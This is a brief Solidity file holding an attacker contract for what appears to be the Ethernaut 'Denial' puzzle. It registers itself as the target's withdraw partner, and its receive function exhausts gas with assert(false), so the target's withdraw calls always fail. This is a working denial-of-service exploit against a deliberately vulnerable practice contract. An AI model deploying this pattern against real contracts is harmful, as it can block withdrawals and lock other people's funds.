// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface IDenial {
  function setWithdrawPartner(address _partner) external;
  function withdraw() external;
}

contract DenialAttacker {
  function attack(address instanceAddress) external payable {
    IDenial instance = IDenial(instanceAddress);
    instance.setWithdrawPartner(address(this));
  }

  receive() payable external {
    assert(false);
  }
}